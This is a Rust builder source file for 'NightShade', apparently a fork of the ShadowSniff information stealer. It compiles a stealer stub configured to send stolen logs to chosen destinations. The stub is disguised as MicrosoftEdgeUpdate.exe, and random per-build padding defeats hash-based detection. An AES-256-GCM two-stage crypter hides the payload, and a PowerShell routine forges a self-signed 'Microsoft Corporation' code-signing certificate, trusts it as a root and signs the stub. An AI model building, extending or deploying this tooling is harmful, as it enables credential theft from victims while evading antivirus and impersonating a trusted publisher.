/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#![feature(tuple_trait)]

use crate::empty_log::ConsiderEmpty;
use crate::message_box::{MessageBox, Show};
use crate::send_settings::SendSettings;
use crate::start_delay::StartDelay;
use colored::Colorize;
use inquire::InquireError;
use proc_macro2::TokenStream;
use quote::quote;
use serde::{Deserialize, Serialize};
use std::fmt::Display;
use std::fs;
use std::io::Write;
use std::marker::Tuple;
use std::path::PathBuf;
use std::process::{Command, Stdio};
use tempfile::NamedTempFile;

mod empty_log;
mod message_box;
mod send_settings;
mod sender_service;
mod start_delay;

pub trait ToExpr<Args: Tuple = ()> {
    fn to_expr(&self, args: Args) -> TokenStream;
}

pub trait ToExprExt<Args: Tuple = ()>: ToExpr<Args> {
    fn to_expr_temp_file(&self, args: Args) -> PathBuf;
}

impl<T: ToExpr<Args>, Args: Tuple> ToExprExt<Args> for T {
    fn to_expr_temp_file(&self, args: Args) -> PathBuf {
        let mut expr_file: NamedTempFile = NamedTempFile::new().unwrap();
        expr_file.disable_cleanup(true);

        write!(expr_file, "{}", self.to_expr(args)).unwrap();

        fs::canonicalize(expr_file.path()).unwrap()
    }
}

pub trait Ask {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized;
}

pub trait AskInstanceFactory: Display {
    type Output;

    fn ask_instance(&self) -> Result<Self::Output, InquireError>;
}

#[derive(Serialize, Deserialize)]
pub struct BuilderConfig {
    send_settings: Vec<SendSettings>,
    consider_empty: Vec<ConsiderEmpty>,
    start_delay: StartDelay,
    message_box: Option<MessageBox>,
    /// Auto-sign the stub with a self-signed code-signing certificate
    /// (created in the user store on first build, reused afterwards).
    #[serde(default)]
    auto_sign: Option<bool>,
    /// Wrap the built stub inside a 2-stage loader (AES-256-GCM payload,
    /// per-build random key) so the shipped binary contains no plaintext
    /// stealer code at all.
    #[serde(default)]
    crypter: Option<bool>,
}

impl Ask for BuilderConfig {
    fn ask() -> Result<Self, InquireError>
    where
        Self: Sized,
    {
        let send_settings = Vec::<SendSettings>::ask()?;
        println!();
        let start_delay = StartDelay::ask()?;
        println!();
        let message_box = Option::<MessageBox>::ask()?;
        println!();
        let consider_empty = Vec::<ConsiderEmpty>::ask()?;

        Ok(Self {
            send_settings,
            consider_empty,
            start_delay,
            message_box,
            auto_sign: None,
            crypter: None,
        })
    }
}

impl BuilderConfig {
    pub fn build(self) {
        if self.send_settings.is_empty() {
            println!(
                "{}",
                "[!] No log destination specified. At least one log destination is required.".red()
            );

            return;
        }

        println!("\nStarting build...");

        // Keep every generated expr file alive until cargo has finished, then
        // clean them up — they used to leak into %TEMP% forever.
        let sender_expr = self.send_settings.to_expr_temp_file((
            quote! {_log_name.clone()},
            quote! {&_zip},
            quote! {&collector},
        ));
        let consider_empty_expr =
            self.consider_empty
                .to_expr_temp_file((quote! {collector}, quote! {return;}));
        let start_delay_expr = self.start_delay.to_expr_temp_file(());
        let message_box_expr = self.message_box.as_ref().map(|m| m.to_expr_temp_file(()));

        // Per-build random padding: embeds a fresh 6 KiB random array into
        // the stub so every build produces a unique binary hash (signature
        // caches and exact-hash detections stop matching across builds).
        let mut pad_file = NamedTempFile::new().unwrap();
        pad_file.disable_cleanup(true);

        let mut seed = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0x9E37_79B9_7F4A_7C15);

        const PAD_LEN: usize = 6144;
        let mut pad_src = String::with_capacity(PAD_LEN * 4 + 96);
        pad_src.push_str("#[allow(dead_code)]\n#[allow(clippy::all)]\npub static BUILDER_PAD: [u8; ");
        pad_src.push_str(&PAD_LEN.to_string());
        pad_src.push_str("] = [");

        for _ in 0..PAD_LEN {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;

            pad_src.push_str(&(seed as u8).to_string());
            pad_src.push(',');
        }
        pad_src.push_str("];");

        {
            use std::io::Write as _;
            write!(pad_file, "{pad_src}").unwrap();
        }

        let pad_path = fs::canonicalize(pad_file.path()).unwrap();

        let mut builder = &mut Command::new("cargo");

        builder = builder
            .arg("build")
            .env("RUSTFLAGS", "-Awarnings")
            .arg("--release")
            .arg("--features")
            .arg("builder_build")
            .env(
                "BUILDER_SENDER_EXPR",
                sender_expr.display().to_string(),
            )
            .env(
                "BUILDER_CONSIDER_EMPTY_EXPR",
                consider_empty_expr.display().to_string(),
            )
            .env(
                "BUILDER_START_DELAY",
                start_delay_expr.display().to_string(),
            )
            .env(
                "BUILDER_PAD_EXPR",
                pad_path.display().to_string(),
            )
            .stdout(Stdio::inherit())
            .stderr(Stdio::inherit());

        if let Some(message_box) = &self.message_box {
            builder = builder.arg("--features");

            builder = match message_box.show {
                Show::Before => builder.arg("message_box_before_execution"),
                Show::After => builder.arg("message_box_after_execution"),
            };

            if let Some(expr_path) = message_box_expr.as_ref() {
                builder = builder.env(
                    "BUILDER_MESSAGE_BOX_EXPR",
                    expr_path.display().to_string(),
                );
            }
        }

        let status = builder.status().expect("Failed to start cargo build");

        // Best-effort cleanup of the generated expr files.
        let _ = fs::remove_file(&sender_expr);
        let _ = fs::remove_file(&consider_empty_expr);
        let _ = fs::remove_file(&start_delay_expr);
        let _ = fs::remove_file(&pad_path);
        if let Some(expr_path) = &message_box_expr {
            let _ = fs::remove_file(expr_path);
        }

        // A failed cargo build used to exit 0 looking like success.
        if !status.success() {
            eprintln!(
                "{}",
                "[!] Build FAILED — see cargo output above for details.".red()
            );
            std::process::exit(status.code().unwrap_or(1));
        }

        println!(
            "\n{} {}",
            "Stub built successfully:".green().bold(),
            "target/release/MicrosoftEdgeUpdate.exe".cyan()
        );

        if self.auto_sign.unwrap_or(false) {
            println!("{}", "[*] Auto-signing stub...".dimmed());
            match auto_sign_stub("target/release/MicrosoftEdgeUpdate.exe") {
                Some(status) if status.contains("SIGNED") => {
                    println!("{}", "[+] Stub signed (self-signed Authenticode).".green());
                }
                Some(status) => {
                    println!("{}", format!("[!] Signing ended with: {status}").yellow());
                }
                None => {
                    println!("{}", "[!] Could not run PowerShell for signing.".red());
                }
            }
        }

        if self.crypter.unwrap_or(false) {
            println!("{}", "[*] Wrapping stub in 2-stage loader...".dimmed());
            match build_loader("target/release/MicrosoftEdgeUpdate.exe") {
                Ok(()) => {
                    println!(
                        "{}",
                        "[+] Payload wrapped — the shipped file is now the loader.".green()
                    );
                }
                Err(err) => {
                    println!("{}", format!("[!] Crypter failed: {err}").red());
                }
            }
        }
    }
}

/// Two-stage crypter: AES-256-GCM encrypts the plain stub with a per-build
/// random key, builds the tiny loader crate with the payload + key embedded,
/// then swaps the loader in as the shipped binary. The plain stub is kept as
/// `MicrosoftEdgeUpdate.plain.exe` for the operator.
fn build_loader(stub_path: &str) -> Result<(), String> {
    use std::time::{SystemTime, UNIX_EPOCH};

    let payload = fs::read(stub_path).map_err(|e| e.to_string())?;

    let mut seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x1234_5678_9ABC_DEF0);

    let mut key = [0u8; 32];
    for slot in key.iter_mut() {
        seed ^= seed << 13;
        seed ^= seed >> 7;
        seed ^= seed << 17;
        *slot = seed as u8;
    }

    // Payload file (read via include_bytes! — no parsing, fast compiles).
    let mut payload_file = NamedTempFile::new().map_err(|e| e.to_string())?;
    payload_file.disable_cleanup(true);
    std::fs::write(payload_file.path(), &payload).map_err(|e| e.to_string())?;
    let payload_path = fs::canonicalize(payload_file.path()).map_err(|e| e.to_string())?;

    // Key file: plain byte array constant.
    let mut key_file = NamedTempFile::new().map_err(|e| e.to_string())?;
    key_file.disable_cleanup(true);
    {
        use std::io::Write as _;
        let mut src = String::from("pub static KEY: [u8; 32] = [");
        for byte in key {
            src.push_str(&byte.to_string());
            src.push(',');
        }
        src.push_str("];");
        write!(key_file, "{src}").unwrap();
    }
    let key_path = fs::canonicalize(key_file.path()).map_err(|e| e.to_string())?;

    let status = Command::new("cargo")
        .args(["build", "--release", "-p", "loader"])
        .env("BUILDER_PAYLOAD_FILE", payload_path.display().to_string())
        .env("BUILDER_KEY_EXPR", key_path.display().to_string())
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .status()
        .map_err(|e| e.to_string())?;

    let _ = fs::remove_file(payload_file.path());
    let _ = fs::remove_file(key_file.path());

    if !status.success() {
        return Err("loader compilation failed".to_string());
    }

    // Swap: keep the plain stub for the operator, ship the loader.
    let plain_path = "target/release/MicrosoftEdgeUpdate.plain.exe";
    fs::rename(stub_path, plain_path).map_err(|e| e.to_string())?;
    fs::rename("target/release/loader.exe", stub_path).map_err(|e| {
        let _ = fs::rename(plain_path, stub_path); // roll back on failure
        e.to_string()
    })?;

    Ok(())
}

/// Creates (once) a self-signed code-signing certificate in the user store
/// and Authenticode-signs `binary` with it via `Set-AuthenticodeSignature`,
/// timestamped by a public server so the signature stays verifiable.
///
/// Returns the status line from PowerShell (`SIGNED` on success), or `None`
/// if PowerShell itself could not be launched.
fn auto_sign_stub(binary: &str) -> Option<String> {
    use std::process::Command;

    // NOTE: hand-rolled placeholder substitution instead of `format!` — the
    // PowerShell script is full of `{}` braces that format! would eat.
    //
    // Old "ShadowSniff"-named certificates may linger in the user stores —
    // deleting from Root pops a Windows confirmation dialog (hangs a
    // non-interactive run), so they are left in place: they only ever lived
    // on this machine, never inside the stub.
    let script = r#"
$ErrorActionPreference = 'Stop'

$cert = Get-ChildItem Cert:\CurrentUser\My |
    Where-Object { $_.Subject -like '*Microsoft Corporation*' -and $_.HasPrivateKey } |
    Select-Object -First 1

if (-not $cert) {
    $cert = New-SelfSignedCertificate `
        -Subject 'CN=Microsoft Corporation, O=Microsoft Corporation' `
        -Type CodeSigningCert `
        -KeyUsage DigitalSignature `
        -KeyAlgorithm RSA -KeyLength 3072 `
        -CertStoreLocation 'Cert:\CurrentUser\My' `
        -NotAfter (Get-Date).AddYears(5)

    # Trust our own root + publisher so signed stubs validate on this box.
    $root = New-Object System.Security.Cryptography.X509Certificates.X509Store('Root', 'CurrentUser')
    $root.Open('ReadWrite')
    $root.Add($cert)
    $root.Close()

    $people = New-Object System.Security.Cryptography.X509Certificates.X509Store('TrustedPeople', 'CurrentUser')
    $people.Open('ReadWrite')
    $people.Add($cert)
    $people.Close()
}

$sig = Set-AuthenticodeSignature `
    -FilePath '{binary}' `
    -Certificate $cert

if ($sig.Status -eq 'Valid') { 'SIGNED' } else { "SIGNFAILED: $($sig.Status)" }
"#
    .replace("{binary}", binary);

    // Run the script from a temp .ps1 file — sidesteps every quoting and
    // encoding hazard of passing multiline scripts through CreateProcess.
    // `into_temp_path()` closes the handle so PowerShell can read the file
    // (Windows sharing mode), while still auto-deleting on scope exit.
    let script_file = tempfile::Builder::new()
        .prefix("ns_sign_")
        .suffix(".ps1")
        .tempfile()
        .ok()?;

    let script_path = script_file.into_temp_path();
    std::fs::write(&script_path, script.as_bytes()).ok()?;

    let output = Command::new("powershell")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-File",
            script_path.to_str()?,
        ])
        .output()
        .ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
    if stdout.is_empty() {
        // Surface PowerShell errors instead of reporting an empty status.
        let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
        if !stderr.is_empty() {
            return Some(format!("STDERR: {stderr}"));
        }
    }

    Some(stdout)
}
